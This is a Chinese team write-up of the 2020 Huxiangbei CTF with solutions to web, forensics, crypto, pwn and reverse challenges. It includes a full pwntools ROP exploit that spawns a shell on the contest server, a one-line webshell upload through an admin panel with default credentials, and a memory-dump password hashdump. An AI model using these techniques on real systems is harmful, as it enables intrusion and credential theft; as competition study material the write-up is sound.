---
title: 2020hxb-Writeup-cOMING
urlname: 2020hxb-Writeup-cOMING
date: 2020-11-13 09:22:25
updated: 
comments: false
tags: 
  - 内存取证
  - 文件上传
  - volatility
  - 伪加密
  - 明文攻击
  - 维吉尼亚密码
  - pyc反编译
categories: 
  - Write-Up
permalink: 
---

# 湖湘杯2020
## 队伍情况
队伍名称：cOMING


## 队伍成员
gyy,Trick,hxq

## Web

### 题目名字不重要反正题挺简单的
直接白给phpinfo
../?file=phpinfo


### NewWebsite

进网站找后台./admin/
输入用户名密码均为admin登陆成功,html发现有/?r=manageinfo，进入改头像，上传一句话木马，蚁剑连上可得flag

91d7fbeecf940113dfca79a0194d8292

## MISC

### passwd
`volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw  imageinfo`
![](http://err0r.top:3000/uploads/upload_c347085b1db7d7268268cc2014b40fac.png)
内存取证 win7：
`volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump`
![](http://err0r.top:3000/uploads/upload_3ff9c3b3f49563b975214ae71195a024.png)
MD5解出CTF：
aad3...：空密码
0a64...:qwer1234
再结合题目：we need sha1(password)!!!
sha1解密qwer1234
![](http://err0r.top:3000/uploads/upload_5ab11806f4d8e3e805a49794e8319db5.png)
出flag

### 虚实之间
开文件发现`mingwen - 副本.txt`是伪加密,拖出来打包后明文攻击
爆破得密码：123%asd!O

![](http://err0r.top:3000/uploads/upload_333a962f0581af1e5b081ed38eaacbfa.png)

```
仅需5，跳过去
ffd5e341le25b2dcab15cbb}gc3bc5b{789b51
```
联想栅栏加密
直接出flag
![](http://err0r.top:3000/uploads/upload_497c21ab22bea253cc028dd0f698d4a5.png)

### 颜文字

东西很多，最终发现这有个.html是有用的
![](http://err0r.top:3000/uploads/upload_d56b5da1e48c1f700196da21ac72d6e6.png)

打开，F12
![](http://err0r.top:3000/uploads/upload_3dc7159e9614178aa1cb3dad56ac147f.png)
发现base64

```

KO+9oe+9peKIgO+9pSnvvonvvp7ll6hIaX4gCm==
KO+8oF/vvKA7KSjvvKBf77ygOyko77ygX++8oDspCr==	      	 	      	    
KCtfKyk/KOOAgj7vuL88KV/OuCjjgII+77i/PClfzrgK  	     	    	    	      
bygq77+j4pa977+jKinjg5bjgpwK      	       	    	   	  	      
77yc77yI77y+77yN77y+77yJ77yeKOKVr+KWveKVsCAp5aW96aaZfn4K 	       	      
44O9KOKcv+++n+KWve++nynjg44o77yg77y+77yQ77y+KQp=  		       	    
KF5e44Kezqgo77+j4oiA77+jKc6oKuKYhSzCsCo6LuKYhijvv6Pilr3vv6MpLyQ6Ki7CsOKYhSog44CCCp==
flwo4omn4pa94ommKS9+byhe4pa9XilvKMKs4oC/wqwpKCriiafvuLbiiaYpKSjvv6Pilr3vv6MqICnjgp7ilLPilIHilLMo4pWv4oC14pah4oCyKeKVr++4teKUu+KUgeKUuwp=
4pSz4pSB4pSzIOODjigg44KcLeOCnOODjingsqBf4LKgCn==       		     	 
4LKgX+CyoCjila/igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF/CrCApCp==
KOODjuOBuO+/o+OAgSlvKO+/o+KUsO+/oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+/o++4v++/oyko77+jzrUoI++/oykK
KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo=
KMKsX8KsIiko77+j77mP77+j77ybKSjila/CsOKWocKw77yJ4pWv77i1IOKUu+KUgeKUu+ODvSjjgpzilr3jgpzjgIAp77yNQzwoLzvil4c7KS9+KOODmO+9pV/vvaUp44OY4pSz4pSB4pSzCu==
4LKgX+CyoCjila/igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF/CrCApCo==
KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIMK
4oqZ77mP4oqZ4oil44O9KCrjgII+0JQ8KW/jgpwvKOOEkm/jhJIpL35+KCNfPC0p77yI77ye5Lq677yc77yb77yJCo==
KOODjuOBuO+/o+OAgSlvKO+/o+KUsO+/oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+/o++4v++/oyko77+jzrUoI++/oykK
KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq=
KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCm==
KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCs==
KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAp=
KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCr==
KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCt==
KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAr=
KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCi==
KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCn==
KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo=
KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCp==
KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCq==
KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCl==
KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i/zKvMv++/ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq=
KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY/ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCl==
KG/vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+/o+KWve+/oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCi==
KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK      	  	     	 
KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK  	     		   
KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK	   	  	 
KOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIo4pWv4oC14pah4oCyKeKVr+eCuOW8ue+8geKAouKAouKAoijila/igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKOKVr+KAteKWoeKAsinila/ngrjlvLnvvIHigKLigKLigKIK
ZmxhZ+iiq+aIkeeCuOayoeS6huWTiOWTiOWTiC==

```
解密后：

```

(｡･∀･)ﾉﾞ嗨Hi~ 

(＠_＠;)(＠_＠;)(＠_＠;)

(+_+)?(。>︿<)_θ(。>︿<)_θ

o(*￣▽￣*)ブ゜

＜（＾－＾）＞(╯▽╰ )好香~~

ヽ(✿ﾟ▽ﾟ)ノ(＠＾０＾)

(^^ゞΨ(￣∀￣)Ψ*★,°*:.☆(￣▽￣)/$:*.°★* 。

~\(≧▽≦)/~o(^▽^)o(¬‿¬)(*≧︶≦))(￣▽￣* )ゞ┳━┳(╯‵□′)╯︵┻━┻

┳━┳ ノ( ゜-゜ノ)ಠ_ಠ

ಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )

(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ<( ‵□′)>──

(¬_¬")(￣﹏￣；)(╯°□°）╯︵ ┻━┻ヽ(゜▽゜　)－C<(/;◇;)/~(ヘ･_･)ヘ┳━┳

ಠ_ಠ(╯‵□′)╯炸弹！•••*～●(¬_¬ )

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～(　TロT)σ(〃

⊙﹏⊙∥ヽ(*。>Д<)o゜/(ㄒoㄒ)/~~(#_<-)（＞人＜；）

(ノへ￣、)o(￣┰￣*)ゞ╰(艹皿艹 )（︶^︶）(* ￣︿￣)(￣ε(#￣)

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ<( ‵□′)>──

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ<( ‵□′)>──

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ<( ‵□′)>──

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ<( ‵□′)>──

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(ﾟДﾟ*)ﾉ○|￣|_ =3(ノ｀Д)ノ(′д｀σ)σ(￢︿̫̿￢☆)～(　TロT)σ<( ‵□′)>──

(⊙ˍ⊙)？(σ｀д′)σ<( ‵□′)>───Ｃε(┬﹏┬)3<( ‵□′)───C＜─___-)||～(　TロT)σ(〃＞目＜)

(oﾟvﾟ)ノd=====(￣▽￣*)bε=ε=ε=(~￣▽￣)~(❤ ω ❤)U•ェ•*U

(╯‵□′)╯炸弹！•••

(╯‵□′)╯炸弹！•••

(╯‵□′)╯炸弹！•••

(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••(╯‵□′)╯炸弹！•••

flag被我炸没了哈哈哈

```
空格和base64加密的颜文字
stegsnow解出现乱码
拿颜文字的base64跑base64隐写，得到秘钥`lorrie`
连到自己的服务器上nc保存文件
![](http://err0r.top:3000/uploads/upload_e1246d8da57831ac61db9db06a8cb7e7.png)


![](http://err0r.top:3000/uploads/upload_a9d05ca3684423b0bdec23e5ad4bdc0d.png)

![](http://err0r.top:3000/uploads/upload_87e30c8ce32bf823f52a6995d01008de.png)
`→_→`替换为`-`,`←_←`替换为`.`,去网站上解码
![](http://err0r.top:3000/uploads/upload_37297a6534ae9687e762575520e3be88.png)

![](http://err0r.top:3000/uploads/upload_deb9e10ded0547223c72de150e3e7986.png)




## CRYPTO

### 古典美++
利用网站工具得维吉尼亚密码密钥
![](http://err0r.top:3000/uploads/upload_f1091c0a40a04c7e0ca2ff4ee943818e.png)
为`orderby`
生成MD5
![](http://err0r.top:3000/uploads/upload_08211c0d9eea3dd803668f9de50f81d9.png)


## Pwn

### pwn_printf

exp:
```
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal=['tmux','splitw','-h']
p = remote('47.111.96.55',54606)
elf = ELF('./pwn_printf')
read_plt = elf.symbols['read']
read_got = elf.got['read']
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
pop_rdi = 0x401213
v_addr = 0x4007C6
scanf = 0x4006A0
pop_rsi_ret = 0x401211
p.recvuntil("You will find this game very interesting")
for i in range(16):
	p.sendline("32")
payload1 = b'a'*0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi) + p64(0x40) + p64(v_addr)
p.sendline(payload1)
p.recvline()
rrr = p.recv(6)
puts_addr = u64(rrr.ljust(8,b'\x00'))
print (hex(puts_addr))
wri = 0x06030A0
payload2 = b'a'*0x8 + p64(pop_rdi) + p64(0x0401D99 ) +p64(pop_rsi_ret) +p64(wri)+p64(0)+ p64(scanf) + p64(pop_rdi) + p64(8*4 )+ p64(v_addr+1)
p.recv()
n1 = int(b'/bin'[::-1].hex(),16)
n2 = int(b'/sh\x00'[::-1].hex(),16)
p.sendline(payload2)
print("n1:" + str(n1))
sleep(0.3)
p.sendline(str(n1))
wri = 0x06030A0+4
sleep(0.5)
payload2 = b'a' * 0x8 + p64(pop_rdi) + p64(0x0401D99) + p64(pop_rsi_ret) + p64(wri) + p64(0) + p64(scanf) + p64(v_addr)
p.send(payload2)
p.sendline(str(n2))
payload3 = b'a' * 0x8 + p64(pop_rdi) + p64(0x06030A0) + p64(puts_addr-0x2a300)
sleep(0.5)
p.sendline(payload3)
p.interactive()


```

## Re
### easyre
爆破，逐个击破。。。
实在不会。。。
### easy_c++
IDA分析
一个信息
![](http://err0r.top:3000/uploads/upload_e925529013db912c18fefedaaf9abb14.png)

![](http://err0r.top:3000/uploads/upload_4e828399e4d79eb1e6be0a043cbef7d5.png)
长度32

![](http://err0r.top:3000/uploads/upload_73c378ef6b63554e866b77cfb0a64ee2.png)

exp：
```
public class Test {
    public static void main(String[] args) {
        String a = "7d21e<e3<:3;9;ji t r#w\"$*{*+*$|,";
        char v11;
        int v13;
        for (int i =0; i<32; i++)
        {
            v11 = a.charAt(i);
            v13 = i ^ (int)v11;
            System.out.print((char)v13);
        }
    }
}
```


### ReMe

反编译py
```
python3 pyinstxtractor.py ReMe.exe
```
![](http://err0r.top:3000/uploads/upload_e3d5fa410ab6018e37d44d0eb186cae4.png)

010打开
![](http://err0r.top:3000/uploads/upload_2b11c9c4724fb034f52d40b7f29ca891.png)
置换之后：
![](http://err0r.top:3000/uploads/upload_f2d172c13f5b680885e029a91c53a5ee.png)
改后缀：ReMe.pyc

```
uncompyle6 ReMe.pyc
```

```
λ uncompyle6 ReMe.pyc
# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]
# Embedded file name: ReMe.py
# Compiled at: 1995-09-28 00:18:56
# Size of source mod 2**32: 272 bytes
import sys, hashlib
check = [
 'e5438e78ec1de10a2693f9cffb930d23',
 '08e8e8855af8ea652df54845d21b9d67',
 'a905095f0d801abd5865d649a646b397',
 'bac8510b0902185146c838cdf8ead8e0',
 'f26f009a6dc171e0ca7a4a770fecd326',
 'cffd0b9d37e7187483dc8dd19f4a8fa8',
 '4cb467175ab6763a9867b9ed694a2780',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'cffd0b9d37e7187483dc8dd19f4a8fa8',
 'fd311e9877c3db59027597352999e91f',
 '49733de19d912d4ad559736b1ae418a7',
 '7fb523b42413495cc4e610456d1f1c84',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'acb465dc618e6754de2193bf0410aafe',
 'bc52c927138231e29e0b05419e741902',
 '515b7eceeb8f22b53575afec4123e878',
 '451660d67c64da6de6fadc66079e1d8a',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'fe86104ce1853cb140b7ec0412d93837',
 'acb465dc618e6754de2193bf0410aafe',
 'c2bab7ea31577b955e2c2cac680fb2f4',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'f077b3a47c09b44d7077877a5aff3699',
 '620741f57e7fafe43216d6aa51666f1d',
 '9e3b206e50925792c3234036de6a25ab',
 '49733de19d912d4ad559736b1ae418a7',
 '874992ac91866ce1430687aa9f7121fc']

def func(num):
    result = []
    while num != 1:
        num = num * 3 + 1 if num % 2 else num // 2
        result.append(num)

    return result


if __name__ == '__main__':
    print('Your input is not the FLAG!')
    inp = input()
    if len(inp) != 27:
        print('length error!')
        sys.exit(-1)
    for i, ch in enumerate(inp):
        ret_list = func(ord(ch))
        s = ''
        for idx in range(len(ret_list)):
            s += str(ret_list[idx])
            s += str(ret_list[(len(ret_list) - idx - 1)])

        md5 = hashlib.md5()
        md5.update(s.encode('utf-8'))
        if md5.hexdigest() != check[i]:
            sys.exit(i)

    md5 = hashlib.md5()
    md5.update(inp.encode('utf-8'))
    print('You win!')
    print('flag{' + md5.hexdigest() + '}')
# okay decompiling ReMe.pyc

```

exp:

```
import hashlib

check = [
 'e5438e78ec1de10a2693f9cffb930d23',
 '08e8e8855af8ea652df54845d21b9d67',
 'a905095f0d801abd5865d649a646b397',
 'bac8510b0902185146c838cdf8ead8e0',
 'f26f009a6dc171e0ca7a4a770fecd326',
 'cffd0b9d37e7187483dc8dd19f4a8fa8',
 '4cb467175ab6763a9867b9ed694a2780',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'cffd0b9d37e7187483dc8dd19f4a8fa8',
 'fd311e9877c3db59027597352999e91f',
 '49733de19d912d4ad559736b1ae418a7',
 '7fb523b42413495cc4e610456d1f1c84',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'acb465dc618e6754de2193bf0410aafe',
 'bc52c927138231e29e0b05419e741902',
 '515b7eceeb8f22b53575afec4123e878',
 '451660d67c64da6de6fadc66079e1d8a',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'fe86104ce1853cb140b7ec0412d93837',
 'acb465dc618e6754de2193bf0410aafe',
 'c2bab7ea31577b955e2c2cac680fb2f4',
 '8e50684ac9ef90dfdc6b2e75f2e23741',
 'f077b3a47c09b44d7077877a5aff3699',
 '620741f57e7fafe43216d6aa51666f1d',
 '9e3b206e50925792c3234036de6a25ab',
 '49733de19d912d4ad559736b1ae418a7',
 '874992ac91866ce1430687aa9f7121fc']
def func(number):
    ret = []
    while number != 1:
        number = number * 3 + 1 if number % 2 else number // 2
        ret.append(number)
    return ret
for i in range(1,128):
	a = func(i)
	ans = ""
	for j in range(len(a)):
		ans += str(a[j])
		ans += str(a[(len(a) - j - 1)])
	md5 = hashlib.md5()
	md5.update(ans.encode('utf-8'))
	b = md5.hexdigest()
	for j in range(27):
		if b == check[j]:
			print chr(i),j

```

跑出
flag{My_M@th_3X+1_R3v_Te5t}
再跑md5
![](http://err0r.top:3000/uploads/upload_cb85bf35027674506b95399974b01eee.png)





---
---

最后可能进不了决赛，有点菜，不过坚持到了最后，继续加油吧！